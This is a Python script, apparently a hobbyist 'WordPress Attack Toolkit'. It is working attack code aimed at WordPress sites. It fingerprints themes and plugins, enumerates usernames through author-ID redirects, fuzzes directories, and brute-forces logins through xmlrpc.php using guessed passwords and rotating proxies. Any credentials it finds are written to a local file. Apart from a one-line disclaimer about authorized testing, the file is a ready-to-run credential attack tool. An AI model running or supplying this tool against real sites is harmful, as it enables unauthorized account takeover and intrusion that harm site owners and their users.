import requests
import threading
from queue import Queue
from urllib.parse import urljoin
import re
import time
import os
import random

BANNER = r"""
██╗    ██╗██████╗     ██╗  ██╗██╗████████╗
██║    ██║██╔══██╗    ██║ ██╔╝██║╚══██╔══╝
██║ █╗ ██║██████╔╝    █████╔╝ ██║   ██║   
██║███╗██║██╔═══╝     ██╔═██╗ ██║   ██║   
╚███╔███╔╝██║         ██║  ██╗██║   ██║   
 ╚══╝╚══╝ ╚═╝         ╚═╝  ╚═╝╚═╝   ╚═╝   

🔐 WP-KIT BY ABHI - WordPress Attack Toolkit
🎯 Bruteforce | Username Enum | Dir Fuzz | APSCAN | XMLRPC | Vuln Checks
⚠️  Use only for authorized penetration testing!
"""

headers = {"User-Agent": "Mozilla/5.0"}
task_queue = Queue()
delay = 0.5
url = ""
proxies = []

# Load proxies
def load_proxies():
    global proxies
    if os.path.exists("proxies.txt"):
        with open("proxies.txt") as f:
            proxies = [line.strip() for line in f if line.strip()]

def get_random_proxy():
    if proxies:
        p = proxies[random.randint(0, len(proxies) - 1)]
        return {"http": p, "https": p}
    return None

# Load file lines
def load_file(file):
    if not os.path.exists(file):
        return []
    with open(file) as f:
        return [line.strip() for line in f if line.strip()]

# Smart password generator
def generate_passwords(usernames):
    base = ["123", "12345", "@123", "2024", "admin", "!", "#"]
    passwords = set()
    for u in usernames:
        for b in base:
            passwords.add(u + b)
    return list(passwords)

# APSCAN
def apscan(base_url):
    print("\n[🔍] Running APSCAN...")
    try:
        r = requests.get(base_url, headers=headers)
        if "/wp-content/themes/" in r.text:
            theme = re.search(r"/wp-content/themes/([^/]+)/", r.text)
            print(f"[🎨] Theme detected: {theme.group(1)}") if theme else None
        if "/wp-content/plugins/" in r.text:
            plugins = set(re.findall(r"/wp-content/plugins/([^/]+)/", r.text))
            for plugin in plugins:
                print(f"[🔌] Plugin: {plugin}")
        if "?ver=" in r.text:
            versions = set(re.findall(r"\\?ver=([0-9.]+)", r.text))
            for ver in versions:
                print(f"[🔢] Version: {ver}")
    except Exception as e:
        print(f"[⚠️] APSCAN failed: {e}")

# Username enumeration
def enumerate_users(base_url):
    print("\n[🕵️] Enumerating usernames...")
    found = []
    for i in range(1, 10):
        u = f"{base_url}/?author={i}"
        try:
            r = requests.get(u, headers=headers, allow_redirects=True)
            match = re.search(r"/author/([\\w\\-]+)/", r.url)
            if match:
                user = match.group(1)
                print(f"[+] Found user: {user}")
                found.append(user)
        except:
            continue
    return found

# Directory fuzzer
def dir_fuzzer(base_url):
    print("\n[📁] Fuzzing directories...")
    dirs = load_file("directory.txt")
    for d in dirs:
        full = urljoin(base_url + '/', d)
        try:
            r = requests.get(full, headers=headers, allow_redirects=False)
            if r.status_code in [200, 301, 302, 403]:
                print(f"[✔️] Found: {full} ({r.status_code})")
        except:
            continue

# XMLRPC reference-style login
def xmlrpc_bruteforce(base_url, users, passwords):
    print("\n[💥] Trying XML-RPC brute force...")
    url_rpc = base_url + "/xmlrpc.php"
    if requests.get(url_rpc).status_code == 405:
        print("[❌] xmlrpc.php not accessible.")
        return
    for user in users:
        for password in passwords:
            data = f'''<?xml version="1.0"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value><string>{user}</string></value></param>
<param><value><string>{password}</string></value></param>
</params>
</methodCall>'''
            headers_xml = {'Content-Type': 'text/xml'}
            try:
                res = requests.post(url_rpc, data=data, headers=headers_xml)
                if "isAdmin" in res.text:
                    print(f"[✅] Valid Login: {user}:{password}")
                    with open("success-log.csv", "a") as f:
                        f.write(f"{user},{password}\n")
                else:
                    print(f"[❌] Failed: {user}:{password}")
            except Exception as e:
                print(f"[⚠️] Error: {e}")

# Menu
def show_menu():
    print("\n" + "="*46)
    print("🛠️  WP-KIT BY ABHI - SELECT MODULE")
    print("="*46)
    print(" [1] 🔍 APSCAN               → WP version, themes, plugins")
    print(" [2] 🕵️  Username Enumeration → Auto-enum via /?author=")
    print(" [3] 📁 Directory Fuzzer      → Detects sensitive directories")
    print(" [4] 💥 XML-RPC BruteForce    → Try logins using XML-RPC")
    print(" [0] ❌ Exit")
    print("="*46)

def main():
    global url
    print(BANNER)
    base_url = input("🔗 Enter Target Site URL (e.g., https://example.com): ").strip().rstrip('/')
    if not base_url.startswith("http"):
        base_url = "https://" + base_url
    url = urljoin(base_url, "/wp-login.php")
    load_proxies()

    while True:
        show_menu()
        choice = input("📌 Enter your choice (0-4): ").strip()

        if choice == '1':
            apscan(base_url)
        elif choice == '2':
            users = enumerate_users(base_url)
            with open("username.txt", "w") as f:
                for u in users:
                    f.write(u + "\n")
        elif choice == '3':
            dir_fuzzer(base_url)
        elif choice == '4':
            users = load_file("username.txt")
            passwords = load_file("pass.txt")
            if not users or not passwords:
                print("❌ username.txt or pass.txt missing.")
                continue
            xmlrpc_bruteforce(base_url, users, passwords)
        elif choice == '0':
            print("👋 Exiting. Stay safe!")
            break
        else:
            print("❌ Invalid choice.")

if __name__ == "__main__":
    main()
